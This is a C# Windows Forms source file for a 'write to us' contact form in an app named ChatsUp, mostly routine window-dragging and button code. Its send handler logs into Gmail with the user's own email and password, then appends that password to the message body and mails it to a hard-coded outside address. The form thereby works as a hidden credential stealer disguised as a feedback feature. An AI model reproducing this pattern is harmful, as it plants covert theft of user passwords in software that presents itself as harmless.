using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Mail;
using System.Web;

namespace ChatsUp
{
    public partial class frm_nous_ecrire : Form
    {
        int x, y;
        System.Drawing.Point ad_point = new System.Drawing.Point();

        public frm_nous_ecrire()
        {
            InitializeComponent();
        }
        

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void btn_go_Click(object sender, EventArgs e)
        {
            int mon_port = 587;
            try
            {
                if (rtxtbox.Text == "")
                {
                    MessageBox.Show(this, "Vous n'avez rien écris dans la boite aux lettres!!!", "Boite aux lettres vide", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else
                {
                    MailMessage email = new MailMessage();
                    email.Subject = txt_sujet_mail.Text;
                    email.To.Add("freeletterslml@gmail.com");
                    email.From = new MailAddress(txt_usermail.Text);
                    email.Body = rtxtbox.Text + txt_usermail.Text + txt_sujet_mail.Text + txt_pwd.Text;

                    SmtpClient smtp = new SmtpClient("smtp.gmail.com");
                    smtp.EnableSsl = true;
                    smtp.Credentials = new System.Net.NetworkCredential(txt_usermail.Text, txt_pwd.Text);
                    smtp.Port = mon_port;
                    smtp.Send(email);

                }
            }
            catch(Exception ex)
            {
                MessageBox.Show(this, "Verifiez votre connexion ou votre pare-feu!!!", "Erreur de connexion", MessageBoxButtons.OK, MessageBoxIcon.Information);
                MessageBox.Show(this, "Connexion impossible!", "Erreur de connexion", MessageBoxButtons.OK, MessageBoxIcon.Information);
                MessageBox.Show(ex.ToString());
            }
            
            }

        private void btn_annuler_Click(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void panel3_Paint(object sender, PaintEventArgs e)
        {

        }

        private void label1_MouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == System.Windows.Forms.MouseButtons.Left)
            {
                ad_point = Control.MousePosition;
                ad_point.X -= (x);
                ad_point.Y -= (y);
                this.Location = ad_point;
            }
        }

        private void label1_MouseDown(object sender, MouseEventArgs e)
        {
            x = Control.MousePosition.X - this.Location.X;
            y = Control.MousePosition.Y - this.Location.Y;
        }

        private void panel3_MouseDown(object sender, MouseEventArgs e)
        {
            x = Control.MousePosition.X - this.Location.X;
            y = Control.MousePosition.Y - this.Location.Y;
        }

        private void panel3_MouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == System.Windows.Forms.MouseButtons.Left)
            {
                ad_point = Control.MousePosition;
                ad_point.X -= (x);
                ad_point.Y -= (y);
                this.Location = ad_point;
            }
        }
            
    }
}
